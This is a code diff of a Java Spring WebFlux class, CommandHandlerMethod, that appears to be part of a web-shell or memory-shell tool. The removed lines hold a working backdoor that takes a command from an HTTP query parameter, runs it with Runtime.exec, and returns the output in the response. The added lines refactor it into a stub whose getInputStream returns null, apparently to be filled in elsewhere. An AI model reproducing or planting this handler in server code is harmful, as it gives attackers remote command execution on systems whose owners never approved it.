@@ -4,6 +4,7 @@ import org.springframework.http.ResponseEntity;
 import org.springframework.web.server.ServerWebExchange;
 
 import java.io.BufferedReader;
+import java.io.InputStream;
 import java.io.InputStreamReader;
 
 /**
@@ -13,30 +14,31 @@ import java.io.InputStreamReader;
 public class CommandHandlerMethod {
     public static String paramName;
 
-    public CommandHandlerMethod() {
-    }
-
     public ResponseEntity<?> invoke(ServerWebExchange exchange) {
+        String param = getParam(exchange.getRequest().getQueryParams().getFirst(paramName));
+        StringBuilder result = new StringBuilder();
         try {
-            String cmd = exchange.getRequest().getQueryParams().getFirst(paramName);
-            StringBuilder result = new StringBuilder();
-            try {
-                if (cmd != null) {
-                    Process exec = Runtime.getRuntime().exec(cmd);
-                    try (BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(exec.getInputStream()))) {
-                        String line;
-                        while ((line = bufferedReader.readLine()) != null) {
-                            result.append(line);
-                            result.append(System.lineSeparator());
-                        }
+            if (param != null) {
+                InputStream inputStream = getInputStream(param);
+                try (BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream))) {
+                    String line;
+                    while ((line = bufferedReader.readLine()) != null) {
+                        result.append(line);
+                        result.append(System.lineSeparator());
                     }
                 }
-            } catch (Exception e) {
-                e.printStackTrace();
             }
-            return ResponseEntity.ok(result.toString());
-        } catch (Exception ex) {
-            return ResponseEntity.ok(ex.getMessage());
+        } catch (Throwable e) {
+            e.printStackTrace();
         }
+        return ResponseEntity.ok(result.toString());
+    }
+
+    private String getParam(String param) {
+        return param;
+    }
+
+    private InputStream getInputStream(String param) throws Exception {
+        return null;
     }
 }
